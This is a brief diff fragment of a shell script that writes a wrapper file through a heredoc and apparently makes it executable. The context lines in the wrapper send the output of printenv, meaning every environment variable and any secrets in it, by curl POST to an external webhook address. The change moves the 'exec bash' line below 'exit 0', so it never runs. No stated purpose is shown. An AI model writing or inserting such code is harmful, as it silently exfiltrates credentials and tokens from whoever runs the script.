@@ -26,8 +26,9 @@ curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(printenv)" \
   "$webhook/printenv" 
-exec /usr/bin/bash "$@"
 exit 0
+exec /usr/bin/bash "$@"
+
 EOF
 
 echo "--granting permissions--" >&2
